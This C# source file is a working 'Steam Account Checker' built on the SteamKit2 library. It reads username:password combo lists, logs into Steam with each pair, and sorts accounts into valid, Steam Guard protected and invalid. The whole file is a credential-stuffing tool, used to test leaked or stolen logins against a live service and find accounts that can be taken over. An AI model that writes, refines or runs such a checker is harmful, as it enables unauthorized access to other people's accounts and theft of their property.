// Refactored and documented version of the Steam Account Checker
using SteamKit2;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Windows.Forms;

namespace Steam_Accounts_Checker
{
    public class Checker
    {
        private static int index = 0; // Shared index across threads

        // Event triggered when an account is checked
        public delegate void AccountCheckedEventHandler(int index, int total, Account account);
        public event AccountCheckedEventHandler OnAccountChecked;

        // Event triggered when checking process is complete
        public delegate void CheckerDoneEventHandler(TimeSpan elapsedTime);
        public event CheckerDoneEventHandler OnCheckerDone;

        private void AccountChecked(int index, int total, Account account)
        {
            OnAccountChecked?.Invoke(index, total, account);
        }

        private void CheckerDone(TimeSpan elapsedTime)
        {
            OnCheckerDone?.Invoke(elapsedTime);
        }

        public void CheckAccounts(ref List<string> combos)
        {
            DateTime startTime = DateTime.Now;
            index = 0;

            // Remove duplicates and invalid entries
            combos = combos.Distinct().Where(i => !string.IsNullOrWhiteSpace(i) && i.Contains(":")).ToList();

            int count = combos.Count;

            for (int i = 0; i < count; ++i)
            {
                var parts = combos[i].Split(':');
                string username = parts[0];
                string password = parts[1];

                // Perform check (blocking call)
                var account = CheckAccount(username, password);

                int currentIndex = ++index;

                // Report result in a separate thread
                new Thread(() => AccountChecked(currentIndex, count, account)).Start();

                // When last item is processed, report completion
                if (i == count - 1)
                {
                    TimeSpan elapsed = DateTime.Now - startTime;
                    new Thread(() => CheckerDone(elapsed)).Start();
                }
            }
        }

        private Account CheckAccount(string username, string password)
        {
            return new SteamChecker(username, password).Account;
        }
    }

    public class Accounts
    {
        public List<Account> Valid = new List<Account>();
        public List<Account> SteamGuardProtected = new List<Account>();
        public List<Account> Invalid = new List<Account>();
    }

    public enum Status
    {
        Success,
        SteamGuardProtected,
        Fail
    }

    public class Account
    {
        public string Username;
        public string Password;
        public ulong Id;
        public Status Type;

        public Account(string username, string password, ulong id, Status type)
        {
            Username = username;
            Password = password;
            Id = id;
            Type = type;
        }
    }

    public class SteamChecker
    {
        private SteamClient steamClient;
        private SteamUser steamUser;
        private CallbackManager manager;
        private bool isRunning;
        private string username;
        private string password;
        public Account Account;

        public SteamChecker(string username, string password)
        {
            this.username = username;
            this.password = password;

            steamClient = new SteamClient();
            steamUser = steamClient.GetHandler<SteamUser>();
            manager = new CallbackManager(steamClient);

            // Subscribe to Steam events
            manager.Subscribe<SteamClient.ConnectedCallback>(OnConnected);
            manager.Subscribe<SteamClient.DisconnectedCallback>(OnDisconnected);
            manager.Subscribe<SteamUser.LoggedOnCallback>(OnLoggedOn);
            manager.Subscribe<SteamUser.LoggedOffCallback>(OnLoggedOff);

            isRunning = true;
            steamClient.Connect();

            // Run callbacks until disconnected
            while (isRunning)
                manager.RunWaitCallbacks(TimeSpan.FromSeconds(1));
        }

        private void OnConnected(SteamClient.ConnectedCallback callback)
        {
            if (callback == null)
            {
                MessageBox.Show("Connected callback is null", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            steamUser.LogOn(new SteamUser.LogOnDetails
            {
                Username = username,
                Password = password
            });
        }

        private void OnDisconnected(SteamClient.DisconnectedCallback callback)
        {
            if (callback == null)
            {
                MessageBox.Show("Disconnected callback is null", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            isRunning = false;
        }

        private void OnLoggedOn(SteamUser.LoggedOnCallback callback)
        {
            if (callback.Result == EResult.OK)
            {
                Account = new Account(username, password, steamUser.SteamID, Status.Success);
            }
            else if (callback.Result == EResult.AccountLogonDenied)
            {
                Account = new Account(username, password, steamUser.SteamID, Status.SteamGuardProtected);
            }
            else
            {
                Account = new Account(username, password, 0, Status.Fail);
            }

            steamUser.LogOff();
        }

        private void OnLoggedOff(SteamUser.LoggedOffCallback callback)
        {
            Console.WriteLine($"➜ Disconnected: {callback.Result}");
        }
    }
}
